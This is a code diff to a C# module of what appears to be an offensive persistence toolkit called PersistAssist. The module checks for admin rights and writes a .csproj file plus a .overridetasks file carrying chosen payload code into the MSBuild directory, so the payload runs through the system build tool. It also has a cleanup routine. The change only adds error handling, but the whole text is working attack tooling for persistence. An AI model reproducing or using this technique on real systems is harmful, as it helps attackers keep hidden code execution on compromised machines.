@@ -22,36 +22,39 @@ namespace PersistAssist.Functions
 
         public override PersistType PersistCategory => PersistType.MSBuild;
 
-        public override string PersistExec(ParsedArgs pArgs) {
+        public override string PersistExec(ParsedArgs pArgs)
+        {
+            try {
+                if (!Extensions.isAdmin()) { throw new PersistAssistException("[-] Must be running as Admin to perform this technique"); }
+                if (pArgs.TaskName.isEmpty() || pArgs.Payload.isEmpty()) { throw new PersistAssistException("[-] Incorrect parameters passed. See technique usage"); }
 
-            if (!Extensions.isAdmin()) { throw new PersistAssistException("[-] Must be running as Admin to perform this technique"); }
-            if (pArgs.TaskName.isEmpty() || pArgs.Payload.isEmpty()) { throw new PersistAssistException("[-] Incorrect parameters passed. See technique usage"); }
+                Payload payload = _payloads.FirstOrDefault(cPayload => cPayload.PayloadName.Equals(pArgs.Payload, StringComparison.InvariantCultureIgnoreCase));
+                if (payload is null) { throw new PersistAssistException($"Payload {payload} doesn't exist"); }
 
-            Payload payload = _payloads.FirstOrDefault(cPayload => cPayload.PayloadName.Equals(pArgs.Payload, StringComparison.InvariantCultureIgnoreCase));
-            if (payload is null) { throw new PersistAssistException($"Payload {payload} doesn't exist"); }
+                File.WriteAllText($"{Directory.GetCurrentDirectory()}\\{pArgs.TaskName}.csproj", GenTask(pArgs.TaskName));
+                File.WriteAllText($"{MSBuildPath}\\{pArgs.TaskName}.overridetasks", GenOverride(pArgs.TaskName, payload.PayloadNamespaces, payload.PayloadCode));
 
-            File.WriteAllText($"{Directory.GetCurrentDirectory()}\\{pArgs.TaskName}.csproj", GenTask(pArgs.TaskName));
-            File.WriteAllText($"{MSBuildPath}\\{pArgs.TaskName}.overridetasks", GenOverride(pArgs.TaskName, payload.PayloadNamespaces, payload.PayloadCode));
-            
-            if (File.Exists($"{Directory.GetCurrentDirectory()}\\{pArgs.TaskName}.csproj") && File.Exists($"{MSBuildPath}\\{pArgs.TaskName}.overridetasks"))
-            {
-                return $"MSBuild Override Task successfully deployed\n" +
-                    $"override file path: {MSBuildPath}\\{pArgs.TaskName}.overridetasks";
-            }
+                if (File.Exists($"{Directory.GetCurrentDirectory()}\\{pArgs.TaskName}.csproj") && File.Exists($"{MSBuildPath}\\{pArgs.TaskName}.overridetasks")) {
+                    return $"MSBuild Override Task successfully deployed\n" +
+                        $"override file path: {MSBuildPath}\\{pArgs.TaskName}.overridetasks";
+                } else { return "MSBuild Override Task failed to deploy"; }
 
-            return "MSBuild Override Task failed to deploy";
+            } catch (Exception e) { return $"PersistAssist module failed: {e.Message}"; }
         }
 
-        public override string PersistCleanup(ParsedArgs pArgs) {
-            if (!Extensions.isAdmin()) { throw new PersistAssistException("[-] Must be running as Admin to perform this technique"); }
-            if (pArgs.TaskName.isEmpty() || pArgs.Payload.isEmpty()) { throw new PersistAssistException("[-] Incorrect parameters passed. See technique usage"); }
+        public override string PersistCleanup(ParsedArgs pArgs)
+        {
+            try {
+                if (!Extensions.isAdmin()) { throw new PersistAssistException("[-] Must be running as Admin to perform this technique"); }
+                if (pArgs.TaskName.isEmpty() || pArgs.Payload.isEmpty()) { throw new PersistAssistException("[-] Incorrect parameters passed. See technique usage"); }
 
-            File.Delete($"{Directory.GetCurrentDirectory()}\\{pArgs.TaskName}.csproj");
-            File.Delete($"{MSBuildPath}\\{pArgs.TaskName}.overridetasks");
+                File.Delete($"{Directory.GetCurrentDirectory()}\\{pArgs.TaskName}.csproj");
+                File.Delete($"{MSBuildPath}\\{pArgs.TaskName}.overridetasks");
 
-            if (File.Exists($"{Directory.GetCurrentDirectory()}\\{pArgs.TaskName}.csproj") && File.Exists($"{MSBuildPath}\\{pArgs.TaskName}.overridetasks")) {
-                return "Failed to cleanup MSBuild Override task";
-            } else { return "Successfully cleaned up MSBuild Override task"; }
+                if (File.Exists($"{Directory.GetCurrentDirectory()}\\{pArgs.TaskName}.csproj") && File.Exists($"{MSBuildPath}\\{pArgs.TaskName}.overridetasks")) {
+                    return "Failed to cleanup MSBuild Override task";
+                } else { return "Successfully cleaned up MSBuild Override task"; }
+            } catch (Exception e) { return $"PersistAssist module failed: {e.Message}"; }
         }
     }
 }
